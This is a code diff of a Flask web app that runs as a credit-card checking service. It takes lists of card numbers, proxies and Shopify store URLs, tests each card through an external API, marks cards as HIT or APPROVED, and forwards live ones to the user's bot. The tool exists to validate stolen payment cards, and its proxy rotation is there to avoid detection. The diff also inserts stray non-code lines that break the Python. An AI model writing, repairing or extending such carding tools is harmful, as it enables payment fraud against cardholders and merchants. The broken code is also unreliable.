@@ -653,6 +653,10 @@ def shopify_check():
         return redirect(url_for('login'))
     return render_template('shopify.html', username=session.get('username'), credits=session.get('credits', 0))
 
+not woeking 
+
+this is old route woerking
+
 @app.route('/shopify_check', methods=['GET', 'POST'])
 def shopify_check_process():
     if 'user_id' not in session or 'access_key' not in session:
@@ -664,17 +668,6 @@ def shopify_check_process():
         sites = request.form.get('sites', '').strip().split('\n')
         proxies = request.form.get('proxies', '').strip().split('\n')
         cards = request.form.get('cards', '').strip().split('\n')
-        
-        # Handle file upload for POST requests
-        if 'card_file' in request.files:
-            file = request.files['card_file']
-            if file and file.filename.endswith('.txt'):
-                try:
-                    file_content = file.read().decode('utf-8')
-                    cards_from_file = [c.strip() for c in file_content.split('\n') if c.strip()]
-                    cards.extend(cards_from_file)
-                except Exception as e:
-                    print(f"File upload error: {e}")
     else:  # GET request from EventSource
         sites = request.args.get('sites', '').strip().split('\n')
         proxies = request.args.get('proxies', '').strip().split('\n')
@@ -720,33 +713,17 @@ def shopify_check_process():
                 api_url += f"&proxy={proxy}"
             
             try:
-                # Make the request with better error handling
-                response = requests.get(api_url, proxies=proxy_dict, timeout=25)
-                
-                # Check if response is valid JSON
-                try:
-                    data = response.json()
-                except json.JSONDecodeError:
-                    error_data = {
-                        'card': card,
-                        'status': 'ERROR',
-                        'response': 'Invalid JSON response from API',
-                        'gateway': 'SHOPIFY',
-                        'amount': 'N/A',
-                        'site': site,
-                        'proxy': proxy or 'None'
-                    }
-                    yield f"data: {json.dumps(error_data)}\n\n"
-                    time.sleep(0.5)
-                    continue
+                # Make the request
+                response = requests.get(api_url, proxies=proxy_dict, timeout=30)
+                data = response.json()
                 
                 response_upper = data.get('Response', '').upper()
                 price = data.get('Price', 'N/A')
                 gateway = data.get('Gateway', 'N/A')
-                
                 if 'THANK YOU' in response_upper or 'INSUFFICIENT' in response_upper:
                     bot_response = data.get('Response', 'Unknown')
                     status = 'HIT'
+                
                 elif '3D' in response_upper or 'OTP' in response_upper:
                     bot_response = data.get('Response', 'Unknown')
                     status = 'APPROVED'
@@ -761,26 +738,16 @@ def shopify_check_process():
                     status = 'DECLINED'
                 
                 # Send approved cards to user's bot
-                if status in ['APPROVED', 'HIT']:
+                if status in ['APPROVED', 'APPROVED_OTP']:
                     try:
-                        # Get BIN info for approved cards
-                        bin_number = card[:6]
-                        bin_info = {}
-                        try:
-                            r = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=5)
-                            if r.status_code == 200:
-                                bin_info = r.json()
-                        except:
-                            pass
-                            
                         send_card_to_user_bot(
                             session['user_id'],
                             {
                                 'card': card,
                                 'status': status,
                                 'response': bot_response,
-                                'gateway': gateway,
-                                'bin': bin_info,
+                                'gateway': 'SHOPIFY',
+                                'bin': {},
                                 'timestamp': datetime.now().strftime("%H:%M:%S"),
                                 'amount': price
                             }
@@ -801,28 +768,6 @@ def shopify_check_process():
                 
                 yield f"data: {json.dumps(result_data)}\n\n"
                 
-            except requests.exceptions.Timeout:
-                error_data = {
-                    'card': card,
-                    'status': 'ERROR',
-                    'response': 'Request timeout (25s) - API might be down',
-                    'gateway': 'SHOPIFY',
-                    'amount': 'N/A',
-                    'site': site,
-                    'proxy': proxy or 'None'
-                }
-                yield f"data: {json.dumps(error_data)}\n\n"
-            except requests.exceptions.ConnectionError:
-                error_data = {
-                    'card': card,
-                    'status': 'ERROR',
-                    'response': 'Connection error - API might be down',
-                    'gateway': 'SHOPIFY',
-                    'amount': 'N/A',
-                    'site': site,
-                    'proxy': proxy or 'None'
-                }
-                yield f"data: {json.dumps(error_data)}\n\n"
             except Exception as e:
                 error_data = {
                     'card': card,
